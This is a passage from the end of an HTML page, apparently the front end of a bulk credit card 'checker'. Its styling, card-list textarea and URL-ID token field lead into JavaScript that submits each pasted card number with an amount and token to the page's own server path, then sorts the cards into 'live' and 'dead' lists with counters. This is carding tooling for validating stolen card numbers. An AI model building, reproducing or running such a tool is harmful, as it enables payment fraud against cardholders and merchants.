    }
    .sLive, .sDead, .sTotal {
      border-radius: 7px;
      text-align: center;
    }
    .sLive {
      border: 1px solid #006400;
    }
    .sDead {
      border: 1px solid #8B0000;
    }
    .tkn > textarea {
      color: #fff;
      border-radius: 10px;
      background: black;
      text-align: center;
      width: 60%;
      height: 40px;
      margin-left: 20%;
    }
    .c-cards, .c-response, .c-dbg {
      font-size: 15px;
      opacity: 0.7;
      transition: 0.3s;
      height: 50px;
    }
    .live-r > .c-cards, .live-r > .c-response {
      border: 1px solid #006400;
    }
    .c-dbg:hover, .c-cards:hover, .c-response:hover {
      opacity: 1;
      border-bottom: 1px solid #fff;
    }
    p {
      text-align: center;
    }
    .live-r, .dead-r{
      display: flex;
      width: 100%;
    }
    .rght {
      margin-right: 10px;
    }
    .box {
      width: 50%;
    }
    .cl-live {
      width: 100%;
      border: 1px solid green;
      border-radius: 8px;
    }
    .cl-dead {
      margin-left: 10px;
      width: 100%;
      border: 1px solid darkred;
      border-radius: 8px;
    }
    .cl-dead, .cl-live {
      overflow: auto;
      max-height: 500px;
    }
    .cards-d {
      text-align: center;
    }
    .rslt {
      text-align: center;
      margin: 10px;
    }
    .dead {
      color: rgb(204, 8, 5);
    }
    .live {
      color: rgb(4, 156, 4)
    }
    ::-webkit-scrollbar {
        width: 6px;
    }
    ::-webkit-scrollbar-thumb {
      background: #fff;
      border-radius: 10px;
    }
    .live, .error, .dead {
      font-size: 15px;
    }
    .error {
      color: #FFFF00;
    }
    .select-a {
      color: #ADD8E6;
      width: 100%;
      height: 30px;
      margin: 0 auto;
      background: black;
      border-radius: 10px;
    }
    .amount {
      margin-top: 10px;
    }
    select option {
      text-align: center;
    }
  </style>
</head>
<body>
  <div class="main">
    <header>
      <h1>Checker</h1>
      <hr>
    </header>
    <p>Cards</p>
    <div class="card">
      <textarea id="cards" placeholder="xxxxxxxxxxxxxxxx"></textarea>
    </div>
    <div class="status">
      <div class="tkn">
        <p>Url ID</p>
        <textarea id="token" placeholder="CS7CAC4FB6BB4FB52C5"></textarea>
      </div>
      <div class="decision">
        <button onclick="start()" class="btn-1">Start</button>
        <button class="btn-2">Stop</button>
      </div>
      <div class="sts">
        <div class="column">
          <p class="sLive"><span id="c-live">0</span></p>
          <p class="sDead"><span id="c-dead">0</span></p>
          <p class="sTotal">Total: <span id="total">0</span></p>
        </div>
      </div>
    </div>
  </div>
  <div class="display">
    <div class="cl-live">
      <div class="live-r">
        <div id="c-cards" class="c-cards box">
          <p>Cards</p>
        </div>
        <div id="c-response" class="c-response box">
          <p>Response</p>
        </div>
      </div>
      <div id="card-live">
      </div>
      <div id="live-d">
      </div>
    </div>
    <div class="cl-dead">
      <div class="dead-r">
        <div id="c-cards" class="c-cards box">
          <p>Cards</p>
        </div>
        <div id="c-response" class="c-response box">
          <p>Response</p>
        </div>
        <div id="c-dbg" class="c-dbg box">
          <p >Error: <span id="c-error">0</span></p>
        </div>
      </div>
      <div id="card-dead">
      </div>
      <div id="dead-d">
      </div>
      <div id="dbg-d">
      </div>
    </div>
  </div>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.6.0/jquery.min.js"></script>
  <script src="https://cdnjs.cloudflare.com/ajax/libs/axios/0.26.0/axios.min.js"></script>
  <script type="text/javascript">
    async function start() {
      var cards = $("#cards").val().split("\n");
      $(".sTotal").html("Total: <span id='total'>0</span>");
      let length = cards.length;
      var d = $('#total');
      d.html(length);
      window.amount = $("#v-a").val();
      window.token = $("#token").val();

      await Promise.all(cards.map(checkCard));

      $(".sTotal").html("<p>Checking is DONE!</p>");
    }

    async function checkCard(card) {
      try {
        var s = await axios.get(
          window.location.pathname + "?card=" + card + "&amount=" + window.amount + "&token=" + window.token
        );
        var DT = s.data;

        if (!DT.result) {
          ACounter('error');
          $("#dbg-d").prepend('<div id="rslt" class="rslt error">' + s.data + '<hr></div>');
          $("#card-dead").prepend('<div id="rslt" class="rslt error">' + card + '<hr></div>');
        } else {
          if (DT.result.match('rslt live')) {
            ACounter('live');
            $("#live-d").prepend(DT.result);
            $("#card-live").prepend(DT.cards);
          } else if (DT.result.match('dead')) {
            ACounter('dead');
            $("#dead-d").prepend(DT.result);
            $("#card-dead").prepend(DT.cards);
          } else {
            ACounter('error');
            $("#dbg-d").prepend(DT.result);
            $("#card-dead").prepend(DT.cards);
          }
        }
        CT();
      } catch (error) {
        console.error(error);
        ACounter('error');
        $("#dbg-d").prepend('<div id="rslt" class="rslt error">Error occurred for card: ' + card + '<hr></div>');
        $("#card-dead").prepend('<div id="rslt" class="rslt error">' + card + '<hr></div>');
      }
    }

    function ACounter(sect) {
      var c = $('#c-' + sect);
      c.html(parseInt(c.html()) + 1);
    }

    function CT() {
      var cards = $('#cards').val().split('\n');
      cards.splice(0, 1);
      $("#cards").val(cards.join("\n"));
    }

    $("#card-dead").hide();
    $("#card-live").hide();
    $("#dbg-d").hide();
    $(document).ready(function () {
      $(".dead-r > #c-cards").click(function () {
        $("#dead-d").hide();
        $("#dbg-d").hide();
        $("#card-dead").show();
        $(".dead-r > #c-response").css({ "border-bottom": "" });
        $(".dead-r > #c-dbg").css({ "border-bottom": "" });
        $(".dead-r > #c-cards").css({ "border-bottom": "1px solid white" });
      });
      $(".dead-r > #c-response").click(function () {
        $("#card-dead").hide();
        $("#dbg-d").hide();
        $("#dead-d").show();
        $(".dead-r > #c-cards").css({ "border-bottom": "" });
        $(".dead-r > #c-dbg").css({ "border-bottom": "" });
        $(".dead-r > #c-response").css({ "border-bottom": "1px solid white" });
      });
      $(".dead-r > #c-dbg").click(function () {
        $("#card-dead").hide();
        $("#dead-d").hide();
        $("#dbg-d").show();
        $(".dead-r > #c-response").css({ "border-bottom": "" });
        $(".dead-r > #c-cards").css({ "border-bottom": "" });
        $(".dead-r > #c-dbg").css({ "border-bottom": "1px solid white" });
      });
      $(".live-r > #c-cards").click(function () {
        $("#live-d").hide();
        $("#card-live").show();
        $(".live-r > #c-response").css({ "border-bottom": "" });
        $(".live-r > #c-cards").css({ "border-bottom": "1px solid white" });
      });
      $(".live-r > #c-response").click(function () {
        $("#card-live").hide();
        $("#live-d").show();
        $(".live-r > #c-cards").css({ "border-bottom": "" });
        $(".live-r > #c-response").css({ "border-bottom": "1px solid white" });
      });
    });
  </script>
</body>
</html>